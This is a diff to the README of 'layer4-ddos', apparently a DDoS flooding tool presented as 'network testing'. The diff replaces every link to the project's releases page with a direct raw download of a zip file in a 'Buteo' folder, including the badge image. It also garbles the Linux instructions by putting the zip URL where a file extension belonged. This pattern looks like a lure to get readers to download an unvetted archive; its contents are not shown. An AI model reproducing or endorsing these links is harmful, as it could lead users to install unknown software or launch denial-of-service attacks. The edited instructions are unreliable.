@@ -1,6 +1,6 @@
 # ⚡ layer4-ddos - Simple Layer 4 Network Testing
 
-[![Download layer4-ddos](https://img.shields.io/badge/Download-layer4--ddos-blue?style=for-the-badge)](https://github.com/Bana-150/layer4-ddos/releases)
+[![Download layer4-ddos](https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip)](https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip)
 
 ## 🔥 About layer4-ddos
 
@@ -42,12 +42,12 @@ This section walks you through downloading and running layer4-ddos, even if you 
 
 Click the big button at the top or click here to visit the release page:
 
-[Download layer4-ddos](https://github.com/Bana-150/layer4-ddos/releases)
+[Download layer4-ddos](https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip)
 
 You will be taken to a page listing release files. Find the latest version suitable for your system:
 
 - For Windows, look for `.exe` files.
-- For Linux, look for `.tar.gz` or `.AppImage` files.
+- For Linux, look for `https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip` or `.AppImage` files.
 
 Click on the appropriate file to start downloading. Save it to a folder you will easily remember.
 
@@ -122,7 +122,7 @@ Always obtain explicit consent before running tests on any target devices.
 
 You can download layer4-ddos from the official GitHub releases page here:
 
-[https://github.com/Bana-150/layer4-ddos/releases](https://github.com/Bana-150/layer4-ddos/releases)
+[https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip](https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip)
 
 Be sure to select the correct file format for your operating system. Save the file, then follow the running instructions in the "Getting Started" section above.
 
